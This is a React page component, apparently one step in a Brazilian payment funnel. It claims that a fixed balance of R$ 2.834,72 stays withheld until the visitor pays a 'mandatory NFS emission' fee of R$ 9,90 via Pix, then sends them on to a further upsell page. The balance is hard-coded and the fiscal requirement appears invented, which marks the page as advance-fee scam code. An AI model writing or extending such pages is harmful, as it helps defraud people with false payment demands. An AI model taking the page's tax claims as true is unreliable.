import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import MoneyForPayPopup from '@/components/MoneyForPayPopup';
import { trackViewContent } from '@/lib/tiktokPixel';
import '../styles/app.css';

const SALDO_FINAL = 2834.72;
const TAXA_NFS = 9.90;
const TAXA_NFS_CENTAVOS = 990;

const formatBR = (value: number) => {
  return value
    .toFixed(2)
    .replace('.', ',')
    .replace(/\B(?=(\d{3})+(?!\d))/g, '.');
};

const Up2 = () => {
  const navigate = useNavigate();
  const [showPixPopup, setShowPixPopup] = useState(false);

  useEffect(() => {
    trackViewContent('Emissão NFS', TAXA_NFS);
  }, []);

  const handlePaymentSuccess = () => {
    setShowPixPopup(false);
    navigate('/up3');
  };

  return (
    <main style={{ backgroundColor: '#f5f5f5', minHeight: '100vh', paddingBottom: '40px' }}>
      <div className="title">Emissão NFS</div>

      <div style={{
        backgroundColor: '#fff',
        borderRadius: '12px',
        margin: '0 12px',
        padding: '20px',
        fontFamily: 'Inter, system-ui, sans-serif',
      }}>
        <h1 style={{
          fontSize: '22px',
          fontWeight: 700,
          color: '#000',
          margin: '0 0 16px',
          lineHeight: 1.3,
        }}>
          Emissão NFS obrigatória para liberar saldos acima de R$ 2.000
        </h1>

        <p style={{
          fontSize: '14px',
          color: '#000',
          margin: '0 0 20px',
          lineHeight: 1.5,
        }}>
          A emissão da NFS é um requisito obrigatório para liberar seu saque de{' '}
          <span style={{ color: '#fe2b54', fontWeight: 600 }}>R$ {formatBR(SALDO_FINAL)}</span>.
        </p>

        <div style={{
          backgroundColor: '#f8f9fb',
          borderRadius: '8px',
          padding: '14px',
          marginBottom: '20px',
        }}>
          <p style={{
            fontSize: '13px',
            color: '#666',
            margin: 0,
            lineHeight: 1.5,
          }}>
            Sem esse registro fiscal, o valor não é autorizado pelo sistema e permanece retido até a regularização.
          </p>
        </div>

        <h2 style={{
          fontSize: '14px',
          fontWeight: 600,
          color: '#000',
          margin: '0 0 12px',
        }}>
          A NFS é necessária para:
        </h2>

        <ul style={{
          margin: '0 0 20px',
          paddingLeft: '0',
          listStyle: 'none',
        }}>
          {[
            'Comprovar o valor recebido',
            'Autorizar liberações acima do limite padrão',
            'Evitar retenção automática',
            'Garantir a liberação integral via Pix',
          ].map((item, idx) => (
            <li key={idx} style={{
              fontSize: '14px',
              color: '#444',
              padding: '6px 0',
              display: 'flex',
              alignItems: 'center',
              gap: '10px',
            }}>
              <span style={{
                width: '6px',
                height: '6px',
                borderRadius: '50%',
                backgroundColor: '#fe2b54',
                flexShrink: 0,
              }} />
              {item}
            </li>
          ))}
        </ul>

        <div style={{
          backgroundColor: '#f8f9fb',
          borderRadius: '8px',
          padding: '14px',
          marginBottom: '24px',
        }}>
          <p style={{
            fontSize: '13px',
            color: '#666',
            margin: 0,
            lineHeight: 1.5,
          }}>
            Sem a NFS, o sistema não libera o saque.
          </p>
        </div>

        <div style={{
          display: 'flex',
          justifyContent: 'space-between',
          alignItems: 'center',
          marginBottom: '16px',
        }}>
          <span style={{ fontSize: '14px', fontWeight: 500, color: '#000' }}>
            Valor da emissão da NFS
          </span>
          <span style={{ fontSize: '20px', fontWeight: 700, color: '#000' }}>
            R$ {formatBR(TAXA_NFS)}
          </span>
        </div>

        <button
          onClick={() => setShowPixPopup(true)}
          style={{
            width: '100%',
            padding: '14px',
            backgroundColor: '#fe2b54',
            color: '#fff',
            border: 'none',
            borderRadius: '99px',
            fontSize: '15px',
            fontWeight: 600,
            cursor: 'pointer',
          }}
        >
          Emitir NFS obrigatória
        </button>

        <p style={{
          fontSize: '12px',
          color: '#888',
          textAlign: 'center',
          marginTop: '12px',
          marginBottom: 0,
        }}>
          A emissão é obrigatória para saldos acima de R$ 2.000
        </p>
      </div>

      {showPixPopup && (
        <MoneyForPayPopup
          amount={TAXA_NFS_CENTAVOS}
          productName="Emissão NFS obrigatória"
          pageOrigin="Up2"
          onSuccess={handlePaymentSuccess}
          onClose={() => setShowPixPopup(false)}
        />
      )}
    </main>
  );
};

export default Up2;
